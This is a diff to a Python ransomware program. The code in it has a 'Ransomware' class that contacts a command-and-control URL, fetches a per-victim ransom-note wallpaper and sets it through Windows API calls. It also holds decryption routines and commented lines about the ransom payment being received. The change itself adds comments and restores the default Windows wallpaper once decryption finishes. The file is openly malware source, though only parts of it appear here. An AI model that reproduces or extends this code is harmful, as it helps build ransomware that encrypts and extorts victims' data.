@@ -1,16 +1,15 @@
 # coding: utf-8
 
 import httpx  # Handling HTTP request/responses
-import nacl.secret
+import nacl.secret  # Providing symmetric encryption
 import datetime  # Handling time-related data
 import os, sys  # For system-related data handling (hostname/usernames)
 import base64, pathlib
-import ctypes
+import ctypes  # Calling Windows APIs
 from time import sleep
 from python_hosts import Hosts, HostsEntry
 import pprint
-import threading
-from multiprocessing import Process
+import threading  # Enabling Thread creation
 
 # Debug variables
 c2_url = "http://localhost:5000"
@@ -230,9 +229,20 @@ class Ransomware:
             except Exception as err:
                 print("start_decryption(): Error --> ", err)
 
-    def change_wallpaper(self):
-        "Change the victim's wallpaper to display our ransom note"
+    def change_wallpaper(self, default=False):
+        "Change the wallpaper of the infected PC"
         sleep(3)
+        if default:
+            try:
+                image_path = "C:\\Windows\\Web\\Wallpaper\\Windows\\img0.jpg"
+                ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 0)
+                return
+            except FileNotFoundError as err:
+                print("change_wallpaper(): FileNotFound Error --> ", err)
+                return
+            except Exception as err:
+                print("change_wallpaper(): Error --> ", err)
+                return
         try:
             response = httpx.get(f"{c2_url}/static/wp/{self.victim_id}.png")
         except httpx.TimeoutException as err:
@@ -283,6 +293,7 @@ def fake_main():
     # print("✔✔✔ Payment was received!")
     rnsm.setup_decryption()
     rnsm.start_decryption()
+    rnsm.change_wallpaper(default=True)
     # print("🍾🍾🍾 You are all done, all files are now decrypted!")
 
 
